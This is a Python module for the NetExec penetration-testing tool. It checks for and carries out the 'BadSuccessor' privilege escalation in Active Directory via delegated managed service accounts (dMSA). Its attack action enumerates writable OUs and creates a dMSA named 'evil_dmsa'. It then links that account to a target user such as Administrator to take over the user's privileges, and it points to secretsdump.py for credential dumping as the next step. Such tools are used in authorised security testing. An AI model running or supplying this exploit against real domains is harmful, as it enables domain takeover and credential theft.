import datetime
import secrets

from impacket.ldap import ldap, ldapasn1, ldaptypes
from ldap3.protocol.microsoft import security_descriptor_control
from nxc.parsers.ldap_results import parse_result_attributes

RELEVANT_OBJECT_TYPES = {
    "00000000-0000-0000-0000-000000000000": "All Objects",
    "0feb936f-47b3-49f2-9386-1dedc2c23765": "msDS-DelegatedManagedServiceAccount",
}

EXCLUDED_SIDS_SUFFIXES = ["-512", "-519"]  # Domain Admins, Enterprise Admins
EXCLUDED_SIDS = ["S-1-5-32-544", "S-1-5-18"]  # Builtin Administrators, Local SYSTEM

# Define all access rights
ACCESS_RIGHTS = {
    # Generic Rights
    "GenericRead": 0x80000000,  # ADS_RIGHT_GENERIC_READ
    "GenericWrite": 0x40000000,  # ADS_RIGHT_GENERIC_WRITE
    "GenericExecute": 0x20000000,  # ADS_RIGHT_GENERIC_EXECUTE
    "GenericAll": 0x10000000,  # ADS_RIGHT_GENERIC_ALL

    # Maximum Allowed access type
    "MaximumAllowed": 0x02000000,

    # Access System Acl access type
    "AccessSystemSecurity": 0x01000000,  # ADS_RIGHT_ACCESS_SYSTEM_SECURITY

    # Standard access types
    "Synchronize": 0x00100000,  # ADS_RIGHT_SYNCHRONIZE
    "WriteOwner": 0x00080000,  # ADS_RIGHT_WRITE_OWNER
    "WriteDACL": 0x00040000,  # ADS_RIGHT_WRITE_DAC
    "ReadControl": 0x00020000,  # ADS_RIGHT_READ_CONTROL
    "Delete": 0x00010000,  # ADS_RIGHT_DELETE

    # Specific rights
    "AllExtendedRights": 0x00000100,  # ADS_RIGHT_DS_CONTROL_ACCESS
    "ListObject": 0x00000080,  # ADS_RIGHT_DS_LIST_OBJECT
    "DeleteTree": 0x00000040,  # ADS_RIGHT_DS_DELETE_TREE
    "WriteProperties": 0x00000020,  # ADS_RIGHT_DS_WRITE_PROP
    "ReadProperties": 0x00000010,  # ADS_RIGHT_DS_READ_PROP
    "Self": 0x00000008,  # ADS_RIGHT_DS_SELF
    "ListChildObjects": 0x00000004,  # ADS_RIGHT_ACTRL_DS_LIST
    "DeleteChild": 0x00000002,  # ADS_RIGHT_DS_DELETE_CHILD
    "CreateChild": 0x00000001,  # ADS_RIGHT_DS_CREATE_CHILD
}

# Define which rights are considered relevant for potential abuse
RELEVANT_RIGHTS = {
    "GenericAll": ACCESS_RIGHTS["GenericAll"],
    "GenericWrite": ACCESS_RIGHTS["GenericWrite"],
    "WriteOwner": ACCESS_RIGHTS["WriteOwner"],
    "WriteDACL": ACCESS_RIGHTS["WriteDACL"],
    "CreateChild": ACCESS_RIGHTS["CreateChild"], # Ensure CreateChild is here if needed for general checks
    "WriteProperties": ACCESS_RIGHTS["WriteProperties"],
    "AllExtendedRights": ACCESS_RIGHTS["AllExtendedRights"]
}

# GUID for msDS-DelegatedManagedServiceAccount object type
DMSA_OBJECT_GUID = "0feb936f-47b3-49f2-9386-1dedc2c23765"
CREATE_CHILD_ACE_RIGHT = 0x00000001  # ADS_RIGHT_DS_CREATE_CHILD

FUNCTIONAL_LEVELS = {
    "Windows 2000": 0,
    "Windows Server 2003": 1,
    "Windows Server 2003 R2": 2,
    "Windows Server 2008": 3,
    "Windows Server 2008 R2": 4,
    "Windows Server 2012": 5,
    "Windows Server 2012 R2": 6,
    "Windows Server 2016": 7,
    "Windows Server 2019": 8,
    "Windows Server 2022": 9,
    "Windows Server 2025": 10,
}


class NXCModule:
    """
    -------
    Module by @mpgn based on https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory#credentials
    and https://raw.githubusercontent.com/akamai/BadSuccessor/refs/heads/main/Get-BadSuccessorOUPermissions.ps1
    Enhanced with BadSuccessor attack capabilities.
    """

    name = "badsuccessor"
    description = "Check for and exploit BadSuccessor vulnerability (dMSA privilege escalation)."
    supported_protocols = ["ldap"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = {}
        self.action = "check"
        self.target_user = None
        self.dmsa_name = "evil_dmsa"
        self.ou_dn_option = None
        self.dmsa_full_dn_cleanup = None
        self.domain_name = None
        self.schema_naming_context = None


    def options(self, context, module_options):
        """
        ACTION          Choose the action to perform:
                        check   (default): Check domain functional level, schema, and enumerate vulnerable OUs for dMSA creation.
                        attack  : Perform the BadSuccessor attack.
                        cleanup : Clean up a created dMSA.
        TARGET_USER     Username of the account to impersonate (e.g., Administrator). Required for 'attack'.
        DMSA_NAME       Name for the malicious dMSA (default: evil_dmsa). Used for 'attack'.
        OU_DN           Distinguished Name of the OU to create the dMSA in for the 'attack' action.
                        If not provided, the module will attempt to find a suitable OU.
        DMSA_FULL_DN    Full Distinguished Name of the dMSA to remove. Required for 'cleanup' action.
        """
        self.context = context
        self.module_options = module_options
        self.action = self.module_options.get("ACTION", "check").lower()
        self.target_user = self.module_options.get("TARGET_USER")
        self.dmsa_name = self.module_options.get("DMSA_NAME", "evil_dmsa")
        self.ou_dn_option = self.module_options.get("OU_DN")
        self.dmsa_full_dn_cleanup = self.module_options.get("DMSA_FULL_DN")

        # Validate options based on action
        if self.action == "attack":
            if not self.target_user:
                context.log.error("TARGET_USER option is required for the 'attack' action.")
            if not self.dmsa_name:
                context.log.error("DMSA_NAME option is required for the 'attack' action.")
        elif self.action == "cleanup":
            if not self.dmsa_full_dn_cleanup:
                context.log.error("DMSA_FULL_DN option is required for the 'cleanup' action.")

    def is_excluded_sid(self, sid, domain_sid):
        if sid in EXCLUDED_SIDS:
            return True
        return any(sid.startswith(domain_sid) and sid.endswith(suffix) for suffix in EXCLUDED_SIDS_SUFFIXES)

    def get_domain_sid(self, ldap_session, base_dn):
        """Retrieve the domain SID from the domain object in LDAP"""
        r = ldap_session.search(
            searchBase=base_dn,
            searchFilter="(objectClass=domain)",
            attributes=["objectSid"]
        )
        parsed = parse_result_attributes(r)
        if parsed and "objectSid" in parsed[0]:
            return parsed[0]["objectSid"]
        return None

    def find_bad_successor_ous(self, ldap_session, entries, base_dn):
        domain_sid = self.get_domain_sid(ldap_session, base_dn)
        results = {}
        parsed = parse_result_attributes(entries)
        for entry in parsed:
            dn = entry["distinguishedName"]
            sd_data = entry["nTSecurityDescriptor"]
            sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)

            for ace in sd["Dacl"]["Data"]:
                if ace["AceType"] != ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
                    continue

                has_relevant_right = False
                mask = int(ace["Ace"]["Mask"]["Mask"])
                for right_value in RELEVANT_RIGHTS.values():
                    if mask & right_value:
                        has_relevant_right = True
                        break

                if not has_relevant_right:
                    continue  # Skip this ACE if it doesn't have any relevant rights

                object_type = getattr(ace, "ObjectType", None)
                if object_type:
                    object_guid = ldaptypes.bin_to_string(object_type).lower()
                    if object_guid not in RELEVANT_OBJECT_TYPES:
                        continue

                sid = ace["Ace"]["Sid"].formatCanonical()
                if self.is_excluded_sid(sid, domain_sid):
                    continue

                results.setdefault(sid, []).append(dn)

            if hasattr(sd, "OwnerSid"):
                owner_sid = str(sd["OwnerSid"])
                if not self.is_excluded_sid(owner_sid, domain_sid):
                    results.setdefault(owner_sid, []).append(dn)
        return results

    def resolve_sid_to_name(self, ldap_session, sid, base_dn):
        """
        Resolves a SID to a samAccountName using LDAP

        Args:
        ----
            ldap_session: The LDAP connection
            sid: The SID to resolve
            base_dn: The base DN for the LDAP search

        Returns:
        -------
            str: The samAccountName if found, otherwise the original SID
        """
        try:
            search_filter = f"(objectSid={sid})"
            response = ldap_session.search(
                searchBase=base_dn,
                searchFilter=search_filter,
                attributes=["sAMAccountName"]
            )

            parsed = parse_result_attributes(response)
            if parsed and "sAMAccountName" in parsed[0]:
                return parsed[0]["sAMAccountName"]
            return sid
        except Exception:
            return sid

    def get_domain_and_schema_info(self, connection):
        """Gets domain name and schema naming context."""
        try:
            # Derive domain name from baseDN
            parts = []
            for part in connection.ldap_connection._baseDN.split(','):
                if part.upper().startswith('DC='):
                    parts.append(part.split('=')[1])
            self.domain_name = '.'.join(parts)
            self.context.log.debug(f"Derived domain name: {self.domain_name}")

            # Get schema naming context from RootDSE using direct ldap_connection method
            root_dse = connection.ldap_connection.search(
                searchFilter="(objectClass=*)",
                attributes=["schemaNamingContext"],
                searchBase="",
                sizeLimit=0
            )
            
            # Process RootDSE response
            for entry in root_dse:
                if hasattr(entry, 'getAttributes'):
                    attrs = entry.getAttributes()
                    if 'schemaNamingContext' in attrs and attrs['schemaNamingContext']:
                        self.schema_naming_context = str(attrs['schemaNamingContext'][0])
                        self.context.log.debug(f"Schema naming context: {self.schema_naming_context}")
                        return True
            
            self.context.log.error("Could not retrieve schema naming context.")
            return False
        except Exception as e:
            self.context.log.error(f"Error getting domain/schema info: {e}")
            return False

    def check_windows_2025_schema(self, connection):
        """Verify Windows Server 2025 schema with dMSA support"""
        self.context.log.info("Checking for Windows Server 2025 dMSA schema support...")
        if not self.schema_naming_context:
            self.context.log.error("Schema naming context not available for schema check.")
            return False

        dmsa_schema_elements = {
            'msDS-DelegatedManagedServiceAccount': '(objectClass=classSchema)',
            'msDS-ManagedAccountPrecededByLink': '(objectClass=attributeSchema)',
            'msDS-DelegatedMSAState': '(objectClass=attributeSchema)',
        }
        found_all = True
        for element_name, ldap_filter in dmsa_schema_elements.items():
            search_filter = f"(&(cn={element_name}){ldap_filter})"
            try:
                # Use NetExec's search method for consistency
                resp = connection.search(
                    searchFilter=search_filter,
                    attributes=["cn"],
                    baseDN=self.schema_naming_context
                )
                parsed_resp = parse_result_attributes(resp)
                if not parsed_resp:
                    self.context.log.warn(f"  Schema element missing: {element_name}")
                    found_all = False
                else:
                    self.context.log.info(f"  Schema element found: {element_name}")
            except Exception as e:
                self.context.log.error(f"Error searching for schema element {element_name}: {e}")
                found_all = False
        
        if found_all:
            self.context.log.success("Windows Server 2025 dMSA schema elements appear to be present.")
        else:
            self.context.log.fail("Some Windows Server 2025 dMSA schema elements may be missing. Attack might not work.")
        return found_all

    def get_user_dn(self, connection, username):
        """Get the distinguishedName of a user."""
        self.context.log.info(f"Attempting to find DN for user: {username}")
        search_filter = f"(&(objectClass=user)(sAMAccountName={username}))"
        try:
            resp = connection.search(
                searchFilter=search_filter,
                attributes=["distinguishedName"]
            )
            parsed_resp = parse_result_attributes(resp)
            if parsed_resp and "distinguishedName" in parsed_resp[0]:
                user_dn = parsed_resp[0]["distinguishedName"]
                self.context.log.success(f"Found DN for {username}: {user_dn}")
                return user_dn
            else:
                self.context.log.error(f"User {username} not found or DN not retrieved.")
                return None
        except Exception as e:
            self.context.log.error(f"Error finding user DN for {username}: {e}")
            return None

    def find_writable_ou_for_dmsa(self, connection):
        """Finds OUs where the current user can create dMSA objects."""
        self.context.log.info("Enumerating OUs with CreateChild (dMSA) permissions...")
        writable_ous = []
        controls = security_descriptor_control(sdflags=0x04) # DACL_SECURITY_INFORMATION
        
        try:
            # Use direct ldap_connection.search for security descriptor controls
            resp = connection.ldap_connection.search(
                searchBase=connection.ldap_connection._baseDN,
                searchFilter="(objectClass=organizationalUnit)",
                attributes=["distinguishedName", "nTSecurityDescriptor", "name"],
                sizeLimit=0,
                searchControls=[controls]
            )
            parsed_resp = parse_result_attributes(resp)

            for entry in parsed_resp:
                ou_dn = entry["distinguishedName"]
                ou_name = entry.get("name", ou_dn)
                sd_data = entry.get("nTSecurityDescriptor")

                if not sd_data:
                    continue
                
                sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=sd_data)
                # self.context.log.debug(f"Checking OU: {ou_name} with SD: {sd}")

                for ace_obj in sd['Dacl']['Data']:
                    ace = ace_obj['Ace']
                    ace_type = ace_obj['AceType']
                    
                    # We are interested in ACCESS_ALLOWED_ACE_TYPE (0) and ACCESS_ALLOWED_OBJECT_ACE_TYPE (5)
                    if ace_type not in [ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE, ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE]:
                        continue

                    mask = ace['Mask']['Mask']
                    sid = ace['Sid'].formatCanonical() # Trustee SID

                    # Check for CreateChild right
                    if mask & CREATE_CHILD_ACE_RIGHT:
                        can_create_dmsa = False # Initialize
                        if ace_type == ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ACE_TYPE:
                            object_type_guid_data = ace_obj.get('ObjectType', None)
                            if object_type_guid_data:
                                # ObjectType is specified in the ACE
                                object_type_guid = ldaptypes.GUID(object_type_guid_data).formatCanonical().lower()
                                if object_type_guid == DMSA_OBJECT_GUID:
                                    can_create_dmsa = True # Specific CreateChild for dMSA
                                # else: CreateChild for a *different* specific object type, so can_create_dmsa remains False for dMSA.
                            else:
                                # ObjectType is NOT specified in the ACE (e.g., NULL GUID).
                                # This means CreateChild applies to ALL child object classes.
                                can_create_dmsa = True
                        elif ace_type == ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE:
                            # Generic ACE (not object-specific)
                            # CreateChild applies to all children, including dMSA.
                            can_create_dmsa = True
                        
                        if can_create_dmsa:
                            # Simplified check: if current user's SID or "Authenticated Users" or "Everyone" has the right.
                            # A full check would involve resolving group memberships of the current user.
                            # For now, we assume the connection user is the one whose permissions matter.
                            # This part needs to be more robust to check against the current user's SID and group SIDs.
                            # For this module, we assume the LDAP connection is made with the user whose context we are checking.
                            self.context.log.highlight(f"Potential writable OU for dMSA: {ou_name} (DN: {ou_dn}) - Trustee: {sid} has CreateChild.")
                            writable_ous.append(ou_dn)
                            break # Found a relevant ACE for this OU
            
            if writable_ous:
                self.context.log.success(f"Found {len(writable_ous)} potential OUs for dMSA creation.")
            else:
                self.context.log.info("No OUs found with explicit CreateChild for dMSA for common SIDs (further checks might be needed for specific user SIDs).")
            return writable_ous
        except Exception as e:
            self.context.log.error(f"Error enumerating writable OUs: {e}")
            return []


    def create_dmsa_object(self, connection, dmsa_full_dn, dmsa_name):
        """Creates a dMSA object."""
        self.context.log.info(f"Creating dMSA object: {dmsa_full_dn}")
        if not self.domain_name:
            self.context.log.error("Domain name not available for dMSA creation.")
            return False

        attributes = [
            ('objectClass', [b'top', b'msDS-GroupManagedServiceAccount', b'msDS-DelegatedManagedServiceAccount']),
            ('sAMAccountName', [dmsa_name.encode('utf-8') + b'$']), # sAMAccountName typically doesn't include the final '$' in ADUC, but often needed this way for tools
            ('userAccountControl', [b'4096']), # WORKSTATION_TRUST_ACCOUNT
            ('msDS-DelegatedMSAState', [b'0']), # Initial state
            ('dNSHostName', [f"{dmsa_name.lower()}.{self.domain_name}".encode('utf-8')]),
            ('servicePrincipalName', [
                f"HOST/{dmsa_name.lower()}.{self.domain_name}".encode('utf-8'),
                f"HOST/{dmsa_name.lower()}".encode('utf-8') # Some tools might expect this form too
            ]),
            ('msDS-SupportedEncryptionTypes', [b'28']), # AES256, AES128, RC4
            ('msDS-ManagedPasswordInterval', [b'30'])
        ]
        
        try:
            connection.ldap_connection.add(dmsa_full_dn, attributes)
            self.context.log.success(f"Successfully created dMSA: {dmsa_full_dn}")

            # Set a random password for the dMSA
            password = secrets.token_urlsafe(32)
            mod_password = [(ldap.LDAP_MOD_REPLACE, 'unicodePwd', [f'"{password}"'.encode('utf-16-le')])]
            connection.ldap_connection.modify(dmsa_full_dn, mod_password)
            self.context.log.info(f"Set random password for dMSA {dmsa_name}.")
            return True
        except ldap.LDAPError as e:
            error_msg = e.args[0].get('desc', str(e)) if isinstance(e.args[0], dict) else str(e)
            self.context.log.error(f"Failed to create or set password for dMSA {dmsa_full_dn}: {error_msg}")
            # Attempt to delete if creation failed mid-way or password set failed
            try:
                connection.ldap_connection.delete(dmsa_full_dn)
                self.context.log.info(f"Cleaned up partially created dMSA: {dmsa_full_dn}")
            except Exception:
                pass # Ignore cleanup error if it wasn't created
            return False

    def perform_badsuccessor_attack(self, connection, dmsa_full_dn, target_user_dn):
        """Sets the predecessor link on the dMSA."""
        self.context.log.info(f"Performing BadSuccessor attack: linking {dmsa_full_dn} to {target_user_dn}")
        
        modifications = [
            (ldap.LDAP_MOD_REPLACE, 'msDS-ManagedAccountPrecededByLink', [target_user_dn.encode('utf-8')]),
            (ldap.LDAP_MOD_REPLACE, 'msDS-DelegatedMSAState', [b'2']) # Migration completed
        ]
        
        try:
            connection.ldap_connection.modify(dmsa_full_dn, modifications)
            self.context.log.success(f"Successfully set predecessor link for {dmsa_full_dn} to {target_user_dn}.")
            self.context.log.highlight(f"dMSA {self.dmsa_name} should now have privileges of {self.target_user}.")
            self.context.log.info("Next steps: Authenticate as the dMSA (e.g., using its password or Kerberos if keys are managed) and use tools like secretsdump.py.")
            return True
        except ldap.LDAPError as e:
            error_msg = e.args[0].get('desc', str(e)) if isinstance(e.args[0], dict) else str(e)
            self.context.log.error(f"Failed to modify dMSA for attack: {error_msg}")
            return False

    def cleanup_dmsa(self, connection, dmsa_full_dn_to_delete):
        """Deletes the specified dMSA object."""
        self.context.log.info(f"Attempting to cleanup/delete dMSA: {dmsa_full_dn_to_delete}")
        try:
            connection.ldap_connection.delete(dmsa_full_dn_to_delete)
            self.context.log.success(f"Successfully deleted dMSA: {dmsa_full_dn_to_delete}")
            return True
        except ldap.LDAPError as e:
            error_msg = e.args[0].get('desc', str(e)) if isinstance(e.args[0], dict) else str(e)
            # Common error: "willing To Perform" with "CONSTRAINT_VIOLATION" if it's still linked or has dependents.
            # Or "NO_SUCH_OBJECT" if already deleted.
            if "NO_SUCH_OBJECT" in error_msg.upper():
                 self.context.log.info(f"dMSA {dmsa_full_dn_to_delete} not found, likely already deleted.")
                 return True
            self.context.log.error(f"Failed to delete dMSA {dmsa_full_dn_to_delete}: {error_msg}")
            return False

    def on_login(self, context, connection):
        self.context = context # Ensure context is set for helper methods if options failed early

        # Initialize domain and schema info
        if not self.get_domain_and_schema_info(connection):
            context.log.error("Could not initialize domain/schema information. Aborting.")
            return

        # Check functional domain level (already partially in original)
        resp_level = connection.ldap_connection.search(
            searchBase=connection.ldap_connection._baseDN,
            searchFilter="(objectClass=domain)",
            attributes=["msDS-Behavior-Version"]
        )
        parsed_resp_level = parse_result_attributes(resp_level)
        domain_level_val = -1
        if parsed_resp_level and "msDS-Behavior-Version" in parsed_resp_level[0]:
            domain_level_val = int(parsed_resp_level[0]["msDS-Behavior-Version"])
            functional_domain_level_name = "Unknown"
            for name, val in FUNCTIONAL_LEVELS.items():
                if val == domain_level_val:
                    functional_domain_level_name = name
                    break
            context.log.info(f"Domain functional level: {functional_domain_level_name} ({domain_level_val})")
        else:
            context.log.warn("Could not determine domain functional level.")

        # Windows Server 2025 functional level is 10 according to the list
        min_dfl_for_attack = FUNCTIONAL_LEVELS.get("Windows Server 2025", 10)
        schema_ok = self.check_windows_2025_schema(connection)

        if self.action == "check":
            context.log.info("Action: Check")
            if domain_level_val < min_dfl_for_attack:
                 context.log.warn(f"Domain functional level is lower than Windows Server 2025. The dMSA predecessor link attack might not be effective.")
            if not schema_ok:
                context.log.warn(f"dMSA schema elements for Windows Server 2025 might be missing.")

            context.log.info("Enumerating OUs with permissions for 'bad successor' (original check)...")
            controls_orig = security_descriptor_control(sdflags=0x07)
            resp_orig_check = connection.ldap_connection.search(
                searchBase=connection.ldap_connection._baseDN,
                searchFilter="(objectClass=organizationalUnit)",
                attributes=["distinguishedName", "nTSecurityDescriptor"],
                searchControls=controls_orig
            )
            results_orig = self.find_bad_successor_ous(connection.ldap_connection, resp_orig_check, connection.ldap_connection._baseDN)
            if results_orig:
                context.log.success(f"Found {len(results_orig)} SIDs with relevant rights on OUs (original check):")
                # (Original logging for these results can be kept or adapted)
            else:
                context.log.info("No results from original 'bad successor' OU permission check.")
            
            self.find_writable_ou_for_dmsa(connection) # New check for dMSA creation spots

        elif self.action == "attack":
            context.log.info("Action: Attack")
            if not self.target_user or not self.dmsa_name: # Should be caught by options, but double check
                context.log.error("TARGET_USER and DMSA_NAME are required for attack. Aborting.")
                return

            if domain_level_val < min_dfl_for_attack:
                context.log.warn(f"Domain functional level is lower than Windows Server 2025. Attack may not work as expected.")
            if not schema_ok:
                context.log.error(f"Required dMSA schema elements for Windows Server 2025 appear to be missing. Attack is unlikely to succeed. Aborting.")
                return

            target_user_dn = self.get_user_dn(connection, self.target_user)
            if not target_user_dn:
                context.log.error(f"Could not find DN for target user {self.target_user}. Aborting attack.")
                return

            ou_to_use_dn = self.ou_dn_option
            if not ou_to_use_dn:
                context.log.info("OU_DN not specified, attempting to find a writable OU...")
                writable_ous = self.find_writable_ou_for_dmsa(connection)
                if not writable_ous:
                    context.log.error("No writable OU found for dMSA creation. Specify OU_DN or ensure permissions. Aborting attack.")
                    return
                ou_to_use_dn = writable_ous[0] # Pick the first one found
                context.log.info(f"Using automatically found writable OU: {ou_to_use_dn}")
            
            dmsa_full_dn = f"CN={self.dmsa_name},{ou_to_use_dn}"
            
            # Check if dMSA already exists, attempt to delete if user wants to overwrite (or add an option for this)
            # For now, we assume it doesn't exist or creation will fail if it does.
            # A more robust approach would be to check first.

            if self.create_dmsa_object(connection, dmsa_full_dn, self.dmsa_name):
                self.perform_badsuccessor_attack(connection, dmsa_full_dn, target_user_dn)
                context.log.warn(f"Remember to cleanup the dMSA later using: --action cleanup DMSA_FULL_DN='{dmsa_full_dn}'")


        elif self.action == "cleanup":
            context.log.info("Action: Cleanup")
            if not self.dmsa_full_dn_cleanup: # Should be caught by options
                context.log.error("DMSA_FULL_DN is required for cleanup. Aborting.")
                return
            self.cleanup_dmsa(connection, self.dmsa_full_dn_cleanup)

        else:
            context.log.error(f"Unknown action: {self.action}")
